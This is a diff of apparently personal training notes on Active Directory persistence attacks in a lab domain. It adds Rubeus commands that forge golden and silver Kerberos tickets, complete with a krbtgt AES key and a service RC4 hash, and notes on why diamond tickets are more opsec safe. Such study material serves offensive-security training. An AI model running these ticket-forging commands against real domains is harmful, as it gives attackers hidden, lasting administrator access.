@@ -358,11 +358,52 @@ If you have already enumerated the above values, manually specify as many you ca
 The Golden ticket forging command looks like this:
 ```
 C:\AD\Tools\Rubeus.exe golden 
-/aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 
-/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 
-/logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+/aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+/user:Administrator /id:500 /pgid:513 
+/domain:dollarcorp.moneycorp.local
+/sid:S-1-5-21-719815819-3726368948-3917688648
+/pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 
+/logoncount:2453
+/netbios:dcorp
+/groups:544,512,520,513
+/dc:DCORP-DC.dollarcorp.moneycorp.local
+/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
 <img width="1195" height="533" alt="image" src="https://github.com/user-attachments/assets/8cabefb2-e6fe-4e33-bb46-2f8daddbbf88" />
 <img width="1156" height="428" alt="image" src="https://github.com/user-attachments/assets/bbd54335-ba90-4c85-b45d-f35481e72c32" />
 
+### Persistence - Silver Ticket
+
+A valid Service Ticket or TGS ticket (Golden ticket is TGT).
+Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
+* Services rarely check PAC (Privileged Attribute Certificate).
+* Services will allow access only to the services themselves.
+* Reasonable persistence period (default 30 days for computer accounts).
+
+<img width="1255" height="653" alt="image" src="https://github.com/user-attachments/assets/0298eebb-969f-4458-a8f2-8671fbe80584" />
+
+Forge a Silver ticket:
+```
+C:\AD\Tools\Rubeus.exe silver
+/service:http/dcorpdc.dollarcorp.moneycorp.local
+/rc4:6e58e06e07588123319fe02feeab775d 
+/sid:S-1-5-21-719815819-3726368948-3917688648
+/ldap
+/user:Administrator
+/domain:dollarcorp.moneycorp.local
+/ptt
+```
+
+Just like the Golden ticket, /ldap option queries DC for information related to the user.
+Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more
+
+### Persistence - Diamond Ticket
+A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account. 
+Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack. 
+
+Once again, the persistence lifetime depends on krbtgt account. A diamond ticket is more opsec safe as it has:
+* Valid ticket times because a TGT issued by the DC is modified
+* In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged
+
+<img width="1562" height="825" alt="image" src="https://github.com/user-attachments/assets/e677d974-161e-48d8-847c-cc5d525d2671" />
